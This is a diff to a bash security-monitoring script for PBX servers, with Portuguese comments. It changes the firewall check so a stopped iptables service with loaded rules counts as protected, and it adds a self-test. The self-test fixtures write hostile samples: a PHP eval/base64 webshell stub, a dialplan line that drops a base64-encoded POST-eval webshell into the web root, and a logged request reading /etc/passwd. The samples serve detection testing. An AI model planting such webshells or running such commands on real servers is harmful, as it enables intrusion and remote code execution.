@@ -549,6 +549,27 @@ seen_forget() {  # $1 = chave: esquece o alerta (a condicao sumiu; se voltar, av
 
 # Lembrete diario: o alerta de queda (firewall/fail2ban) so saia uma vez e podia passar despercebido (v5-Prisma ficou 6 semanas
 # sem firewall). Enquanto continuar parado, repete no maximo 1 vez por dia (o arquivo-flag guarda desde quando).
+# Diz (em texto) por que o firewall esta sem protecao; vazio = protegido.
+fw_probe() {
+  local svc="$1" st rules n
+  st="$(systemctl is-active "$svc" 2>/dev/null)"; [ -n "$st" ] || st=inactive
+  if [ "$svc" = "iptables" ]; then
+    n="$(iptables -S 2>/dev/null | wc -l)"
+    if [ "$st" != "active" ]; then
+      if [ "${n:-0}" -ge "${SENTINEL_FW_MINRULES:-30}" ] && iptables -S 2>/dev/null | grep -q -- '-A INPUT'; then
+        seen_once "fwsvc|$HOSTNAME_S" && log "FIREWALL: servico iptables parado, mas as regras da central estao carregadas (${n} regras): protegido."
+        return 0
+      fi
+      echo "parado (estado: ${st}) e sem regras carregadas"; return 0
+    fi
+    rules="$(iptables -L -n 2>/dev/null | wc -l)"
+    [ "${rules:-0}" -lt 10 ] && echo "ativo, mas praticamente SEM REGRAS (${rules} linhas): o servidor esta aberto"
+    return 0
+  fi
+  [ "$st" = "active" ] || echo "parado (estado: ${st})"
+  return 0
+}
+
 flag_due() { [ -f "$1" ] && [ -n "$(find "$1" -mmin +"${SENTINEL_REMIND_MIN:-1440}" 2>/dev/null)" ]; }
 
 check_firewall() {
@@ -558,23 +579,14 @@ check_firewall() {
   if systemctl is-enabled iptables >/dev/null 2>&1 || systemctl is-active iptables >/dev/null 2>&1; then svc=iptables
   elif systemctl is-enabled firewalld >/dev/null 2>&1 || systemctl is-active firewalld >/dev/null 2>&1; then svc=firewalld; fi
   [ -n "$svc" ] || return 0
-  st="$(systemctl is-active "$svc" 2>/dev/null)"; [ -n "$st" ] || st=inactive
-  local why="parado (estado: ${st})"
-  if [ "$st" != "active" ]; then bad=1
-  elif [ "$svc" = "iptables" ]; then
-    rules="$(iptables -L -n 2>/dev/null | wc -l)"
-    if [ "${rules:-0}" -lt 10 ]; then bad=1; why="ativo, mas praticamente SEM REGRAS (${rules} linhas): o servidor esta aberto"; fi
-  fi
+  # O que importa e ter REGRAS carregadas, nao o estado do servico: na central o firewall pode estar no ar com o servico "iptables"
+  # parado (as regras vem do modulo de seguranca da central). So alerta quando de fato nao ha protecao.
+  local why; why="$(fw_probe "$svc")"
+  [ -n "$why" ] && bad=1
   # Confirmacao: reload do fail2ban/iptables (ex.: atualizacao) deixa as regras vazias por instantes. Reconfere antes de alertar.
   if [ "$bad" = "1" ] && [ ! -f "$flag" ] && [ "${SENTINEL_FW_RECHECK:-8}" -gt 0 ]; then
     sleep "${SENTINEL_FW_RECHECK:-8}"
-    st="$(systemctl is-active "$svc" 2>/dev/null)"; [ -n "$st" ] || st=inactive
-    bad=0
-    if [ "$st" != "active" ]; then bad=1
-    elif [ "$svc" = "iptables" ]; then
-      rules="$(iptables -L -n 2>/dev/null | wc -l)"
-      if [ "${rules:-0}" -lt 10 ]; then bad=1; fi
-    fi
+    why="$(fw_probe "$svc")"; bad=0; [ -n "$why" ] && bad=1
   fi
   if [ "$bad" = "1" ]; then
     if flag_due "$flag"; then
@@ -1020,6 +1032,7 @@ cmd_selftest() {
   mkdir -p "$T/web/fop2/admin"; echo '<?php eval(base64_decode("AAAA")); ?>' > "$T/web/fop2/admin/kint.php"
   mkdir -p "$T/bin" "$T/cron"
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
+  printf '#!/bin/bash\nn=$(cat "%s/ipt_n" 2>/dev/null || echo 3); for i in $(seq 1 "$n"); do echo "-A INPUT -j X$i"; done\n' "$T" > "$T/bin/iptables"; chmod +x "$T/bin/iptables"; echo 3 > "$T/ipt_n"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
   printf 'exten => s,n,System(/var/lib/asterisk/bin/one_touch_record.php ${CHANNEL(name)})\n[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
   printf '200.150.126.174 - - [05/Nov/2026:08:52:07 -0300] "GET /PBX.php?cmd=cat%%20/etc/passwd HTTP/1.1" 200 1884\n' > "$T/access_log"
@@ -1057,6 +1070,11 @@ cmd_selftest() {
   for k in "PBXAPI abuso: 127.0.0.1" "PBXAPI abuso: 45.154.138.99"; do
     if grep -qF "$k" "$T/log"; then bad=$((bad+1)); echo "FALHA: alerta indevido '$k'"; else ok=$((ok+1)); fi
   done
+  # servico iptables parado MAS com regras carregadas (caso v5-Prisma): nao e alerta de firewall
+  echo 90 > "$T/ipt_n"
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log2" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state2" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" SENTINEL_ACCESS_LOGS="$T/access_log" SENTINEL_FW_RECHECK=0 "$0" --scan >/dev/null 2>&1 )
+  if ! grep -qF "FIREWALL: iptables parado" "$T/log2" && grep -qF "regras da central estao carregadas" "$T/log2"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: servico parado com regras carregadas nao podia alertar"; fi
+  echo 3 > "$T/ipt_n"
   # lembrete diario de ponta a ponta: com os flags velhos (2 dias), o alerta repete como LEMBRETE
   touch -d '2 days ago' "$T/state/fw.down" "$T/state/f2b.down" 2>/dev/null
   ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" SENTINEL_ACCESS_LOGS="$T/access_log" SENTINEL_FW_RECHECK=0 "$0" --scan >/dev/null 2>&1 )
